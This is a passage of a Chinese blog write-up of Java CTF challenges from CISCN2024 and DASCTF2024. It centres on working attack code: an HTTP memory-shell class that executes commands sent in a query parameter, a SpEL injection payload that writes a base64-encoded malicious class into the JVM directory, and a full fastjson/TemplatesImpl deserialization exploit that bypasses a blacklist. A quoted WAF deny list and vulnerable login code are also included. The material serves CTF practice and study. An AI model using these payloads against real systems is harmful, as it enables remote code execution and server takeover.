handlerField.set(object,<span class="hljs-built_in">this</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception exception)&#123;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">base64serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(base64serial(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EvilMemshell</span>()));<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange httpExchange)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> httpExchange.getRequestURI().getQuery();<br>        String[] split = query.split(<span class="hljs-string">&quot;=&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SUCCESS&quot;</span>+<span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">if</span> (split[<span class="hljs-number">0</span>].equals(<span class="hljs-string">&quot;shell&quot;</span>)) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> split[<span class="hljs-number">1</span>];<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">int</span> flag=-<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">while</span>((flag=inputStream.read(bytes))!=-<span class="hljs-number">1</span>)&#123;<br>                byteArrayOutputStream.write(bytes,<span class="hljs-number">0</span>,flag);<br>            &#125;<br>            response += byteArrayOutputStream.toString();<br>            byteArrayOutputStream.close();<br>        &#125;<br>        httpExchange.sendResponseHeaders(<span class="hljs-number">200</span>,response.length());<br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> httpExchange.getResponseBody();<br>        outputStream.write(response.getBytes());<br>        outputStream.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>SPEL注入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">payload=T(com.sun.org.apache.xml.internal.security.utils.JavaUtils).writeBytesToFilename(<span class="hljs-string">&quot;/usr/lib/jvm/java-8-openjdk-amd64/jre/classes/EvilMemshell.class&quot;</span>,T(java.util.Base64).getDecoder.decode(<span class="hljs-string">&quot;yv66vgAAADQA6QoAOQBXCgBYAFkKAFgAWgoAOQBbCABcCgBdAF4KAF8AYAoAXwBhBwBiCABjCABkCABlCABmBwBnCgAOAGgIAGkKAF8AagcAawcAbAoAEwBXBwBtCgAVAG4KABUAbwoAFQBwCgBxAHIKABMAcwoAdAB1CQB2AHcHAHgKAB0AVwoAHQB5CgB6AHsKAHwAfQoAfgB/CACACgCBAIIIAIMIAIQKAIEAhQoAhgCHCgCGAIgKAIkAigoAiwCMCgATAI0HAI4KAC0AVwoALQCPCgATAJAKAC0AkAoAEwBwCgCBAJEKAHwAkgoAfACTCgCBAJQKAJUAlgoAlQBwBwCXBwCYBwCZAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACnJlYWRPYmplY3QBAB4oTGphdmEvaW8vT2JqZWN0SW5wdXRTdHJlYW07KVYBAA1TdGFja01hcFRhYmxlBwBrAQAKRXhjZXB0aW9ucwcAmgcAmwcAnAEADGJhc2U2NHNlcmlhbAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmc7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAZoYW5kbGUBACgoTGNvbS9zdW4vbmV0L2h0dHBzZXJ2ZXIvSHR0cEV4Y2hhbmdlOylWBwB4BwCdBwCeBwCfBwCgBwChBwBsAQAKU291cmNlRmlsZQEAEUV2aWxNZW1zaGVsbC5qYXZhDAA8AD0HAKIMAKMApAwApQCmDACnAKgBAAd0aHJlYWRzBwCpDACqAKsHAKwMAK0ArgwArwCwAQATW0xqYXZhL2xhbmcvVGhyZWFkOwEABnRhcmdldAEABnRoaXMkMAEACGNvbnRleHRzAQAEbGlzdAEAFGphdmEvdXRpbC9MaW5rZWRMaXN0DACvALEBAAdoYW5kbGVyDACyALMBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0BABpqYXZhL2lvL09iamVjdE91dHB1dFN0cmVhbQwAPAC0DAC1ALYMALcAPQcAuAwAuQC8DAC9AL4HAL8MAMAAwQcAwgwAwwDEAQAMRXZpbE1lbXNoZWxsDABIAEkHAMUMAMYAxwcAnQwAyADJBwDKDADLAMwBAAE9BwCeDADNAM4BAAhTVUNDRVNTCgEABXNoZWxsDADPANAHANEMANIA0wwA1ADVBwDWDADXANgHAKAMANkA2gwA2wDcAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAN0A3gwA3wDMDADgAOEMAOIA4wwA5ADlDADmAL4HAOcMANsA6AEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAImNvbS9zdW4vbmV0L2h0dHBzZXJ2ZXIvSHR0cEhhbmRsZXIBAB5qYXZhL2xhbmcvSW50ZXJydXB0ZWRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24BACNjb20vc3VuL25ldC9odHRwc2VydmVyL0h0dHBFeGNoYW5nZQEAEGphdmEvbGFuZy9TdHJpbmcBABNbTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9JbnB1dFN0cmVhbQEAAltCAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAD2phdmEvbGFuZy9DbGFzcwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBABkoTGphdmEvaW8vT3V0cHV0U3RyZWFtOylWAQALd3JpdGVPYmplY3QBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBAAVjbG9zZQEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXRFbmNvZGVyAQAHRW5jb2RlcgEADElubmVyQ2xhc3NlcwEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcjsBAAt0b0J5dGVBcnJheQEABCgpW0IBABhqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXIBAA5lbmNvZGVUb1N0cmluZwEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA1nZXRSZXF1ZXN0VVJJAQAQKClMamF2YS9uZXQvVVJJOwEADGphdmEvbmV0L1VSSQEACGdldFF1ZXJ5AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAARyZWFkAQAFKFtCKUkBAAV3cml0ZQEAByhbQklJKVYBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEABmxlbmd0aAEAAygpSQEAE3NlbmRSZXNwb25zZUhlYWRlcnMBAAUoSUopVgEAD2dldFJlc3BvbnNlQm9keQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGdldEJ5dGVzAQAUamF2YS9pby9PdXRwdXRTdHJlYW0BAAUoW0IpVgAhAB0AOQACADoAOwAAAAUAAQA8AD0AAQA+AAAAHQABAAEAAAAFKrcAAbEAAAABAD8AAAAGAAEAAAAIAAIAQABBAAIAPgAAAUoAAwANAAAAv7gAArYAA00stgAEEgW2AAZOLQS2AActLLYACMAACcAACToEGQQEMjoFGQW2AAQSCrYABjoGGQYEtgAHGQYZBbYACDoHGQe2AAQSC7YABjoIGQgEtgAHGQgZB7YACDoHGQe2AAQSDLYABjoJGQkEtgAHGQkZB7YACDoHGQe2AAQSDbYABjoKGQoEtgAHGQoZB7YACMAADjoLGQsDtgAPOgcZB7YABBIQtgAGOgwZDAS2AAcZDBkHKrYAEacABE2xAAEAAAC6AL0AEgACAD8AAABiABgAAAALAAcADAARAA0AFgAOACMADwApABEANQASADsAEwBEABUAUAAWAFYAFwBfABkAawAaAHEAGwB6AB0AhgAeAIwAHwCYACAAoAAiAKwAIwCyACQAugAmAL0AJQC+ACcAQgAAAAkAAvcAvQcAQwAARAAAAAgAAwBFAEYARwAJAEgASQACAD4AAABTAAMABAAAACe7ABNZtwAUTLsAFVkrtwAWTSwqtgAXLLYAGLgAGSu2ABq2ABtOLbAAAAABAD8AAAAaAAYAAAApAAgAKgARACsAFgAsABoALgAlAC8ARAAAAAQAAQASAAkASgBLAAIAPgAAAC0AAwABAAAAEbIAHLsAHVm3AB64AB+2ACCxAAAAAQA/AAAACgACAAAANAAQADUARAAAAAQAAQASAAEATABNAAIAPgAAAT0ABAAKAAAAnyu2ACG2ACJNLBIjtgAkThIlOgQtAzISJrYAJ5kAYS0EMjoFuAAoGQW2ACm2ACo6BhEEALwIOge7ABNZtwAUOggCNgkZBhkHtgArWTYJAp8AEBkIGQcDFQm2ACyn/+i7AC1ZtwAuGQS2AC8ZCLYAMLYAL7YAMToEGQi2ADIrEQDIGQS2ADOFtgA0K7YANToFGQUZBLYANrYANxkFtgA4sQAAAAIAPwAAAEoAEgAAADkACAA6AA8AOwATADwAHgA9ACMAPgAwAD8ANwBAAEAAQQBDAEIAUQBDAF4ARQB3AEYAfABIAIkASQCPAEoAmQBLAJ4ATABCAAAAPAAD/wBDAAoHAE4HAE8HAFAHAFEHAFAHAFAHAFIHAFMHAFQBAAAa/wAdAAUHAE4HAE8HAFAHAFEHAFAAAABEAAAABAABAEYAAgBVAAAAAgBWALsAAAAKAAEAdABxALoACQ==&quot;</span>))<br></code></pre></td></tr></table></figure><p>然后直接打反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">unser=rO0ABXNyAAxFdmlsTWVtc2hlbGwx3CJ1tyzvvgIAAHhw<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240925204348301.png" alt="image-20240925204348301"></p><p>提一嘴，虽然他的waf给ban了很多：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySecurityWaf</span> &#123;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; denychar = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(Arrays.asList(<span class="hljs-string">&quot;java.lang&quot;</span>, <span class="hljs-string">&quot;Runtime&quot;</span>, <span class="hljs-string">&quot;org.springframework&quot;</span>, <span class="hljs-string">&quot;javax.naming&quot;</span>, <span class="hljs-string">&quot;Process&quot;</span>, <span class="hljs-string">&quot;ScriptEngineManager&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;replace&quot;</span>, <span class="hljs-string">&quot;JavaWrapper&quot;</span>, <span class="hljs-string">&quot;System&quot;</span>));<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MySecurityWaf</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">securitycheck</span><span class="hljs-params">(String payload)</span> <span class="hljs-keyword">throws</span> UnsupportedEncodingException &#123;<br>        <span class="hljs-keyword">if</span> (payload.isEmpty()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">reals</span> <span class="hljs-operator">=</span> URLDecoder.decode(payload, <span class="hljs-string">&quot;UTF-8&quot;</span>).toUpperCase(Locale.ROOT);<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.denychar.size(); ++i) &#123;<br>                <span class="hljs-keyword">if</span> (reals.toUpperCase(Locale.ROOT).contains(((String)<span class="hljs-built_in">this</span>.denychar.get(i)).toUpperCase(Locale.ROOT))) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其实还可以考虑拼接绕，但这道题不出网。</p><h2 id="CISCN2024-AWDP-SolonMater"><a href="#CISCN2024-AWDP-SolonMater" class="headerlink" title="CISCN2024-AWDP-SolonMater"></a>CISCN2024-AWDP-SolonMater</h2><p>重走当年路，如果我多看看也许就出了吧。</p><p>那么第二天冠军应该就不会那么提心吊胆地拿了吧。</p><p>但是如果没有前面的失利，又怎能让我破釜沉舟……</p><p>跑题了，回来看题。</p><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>修还是好修，上个<code>snake</code>和<code>log</code>的黑名单就完了。</p><p>我还是以防万一把很多fj链的东西也ban了。</p><p><code>DemoController.class</code>：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011172524360.png" alt="image-20241011172524360"></p><p>漏洞点位很明显，传个json的base64序列化字符串就拿去梭了。</p><p>其实这道attack还是打fj原生反序列化，只是BadAttribute这个玩意被ban了，前面User类进就为所欲为了。</p><p>本来fastjson1.2.80我看到打JNDI的很多，但这里直接给了反序列化的位置，就按他这个来吧。</p><h3 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">User</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">undoManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(undoManager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(jsonArray);<br>        setValue(eventListenerList, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);<br>        <span class="hljs-comment">//BadAttributeValueExpException bd = new BadAttributeValueExpException(null);</span><br>        <span class="hljs-comment">//setValue(bd,&quot;val&quot;,jsonArray);</span><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(templates,eventListenerList);<br>        setValue(a, <span class="hljs-string">&quot;info&quot;</span>, hashMap);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(a);<br>        objectOutputStream.close();<br><br>        <span class="hljs-comment">// Base64 encode the serialized data</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64Encoded</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(base64Encoded);<br><br>        deserialize(base64Encoded);<br>        <span class="hljs-comment">//HackerClass:class java.util.HashMap</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011172403868.png" alt="image-20241011172403868"></p><p>玛德EventlistenerList真好用，只要不ban基本原生链通杀了。</p><p>但这道题要打进去还要bypass一个东西：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">map.size() != jsonObject.length()<br></code></pre></td></tr></table></figure><p>按道理来说，你直接POST传参，这俩是一样的：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/3999180f5aa7cc6e56dbe3d20b6eef3a.png" alt="img"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/e9e0c81c3e288190c5e69896008bafaa.png" alt="img"></p><p>那咋办呢？</p><p>想到了fastjson的<code>@type</code>。</p><p>因为fastjson会默认<code>@type</code>作为键的后面的值拿去反序列化，虽然这里我们欧阳学长也跟了一下发现<code>@type</code>被ban了，但是这里只是用去绕这个判断，这里fastjson就会只认data的键值对，所以长度为1，但map.size()&#x3D;2。</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011233845225.png" alt="image-20241011233845225"></p><p>记录一个小插曲：开始赵哥给出这个玩意的时候我先去试了试发现失败了，后面才发现是java版本报的错，玛德前面用java17忘了换回来开的jar包，有点招笑了。。。。</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011234010762.png" alt="image-20241011234010762"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011234048139.png" alt="image-20241011234048139"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011234107773.png" alt="image-20241011234107773"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011234121961.png" alt="image-20241011234121961"></p><p>放docker也一样，随便通：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241011234215714.png" alt="image-20241011234215714"></p><h2 id="DASCTF2024-0rays-Ezlogin"><a href="#DASCTF2024-0rays-Ezlogin" class="headerlink" title="DASCTF2024-0rays-Ezlogin"></a>DASCTF2024-0rays-Ezlogin</h2><p>其实非常简单的一道打readObjectXML的题目，而且根据这个hutool版本是5.8.11就能找到网上现成的CVE-POC：<a href="https://blog.csdn.net/LJQClqjc/article/details/128855805">漏洞深度分析|CVE-2023-24162 hutool XML反序列化漏洞_cve-2023” 分析-CSDN博客</a>。</p><p>而且依赖中有Jackson2.13，可以打这个Jackson的反序列化漏洞。但是问题在于，最后你要绕这个长度限制，比赛时也是0解，应该都是卡在了这里。</p><p>漏洞点在这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> User <span class="hljs-title function_">login</span><span class="hljs-params">(String username, String password)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>       <span class="hljs-type">File</span> <span class="hljs-variable">userFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(USER_DIR, username + <span class="hljs-string">&quot;.xml&quot;</span>);<br>       <span class="hljs-keyword">if</span> (!userFile.exists()) &#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> readUser(userFile);<br>           <span class="hljs-keyword">if</span> (user != <span class="hljs-literal">null</span> &amp;&amp; user.getPassword().equals(password)) &#123;<br>               login_in = <span class="hljs-literal">true</span>;<br>               <span class="hljs-keyword">return</span> user;<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>           &#125;<br>       &#125;<br>   &#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> User <span class="hljs-title function_">readUser</span><span class="hljs-params">(File userFile)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>       <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> FileUtil.readString(userFile, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>       <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> content.length();<br>       <span class="hljs-keyword">if</span> (checkSyntax(userFile) &amp;&amp; !content.contains(<span class="hljs-string">&quot;java.&quot;</span>) &amp;&amp; !content.contains(<span class="hljs-string">&quot;springframework.&quot;</span>) &amp;&amp; !content.contains(<span class="hljs-string">&quot;hutool.&quot;</span>) &amp;&amp; length &lt;= maxLength) &#123;<br>           System.out.println(maxLength);<br>           <span class="hljs-keyword">return</span> (User)XmlUtil.readObjectFromXml(userFile);<br>       &#125; <span 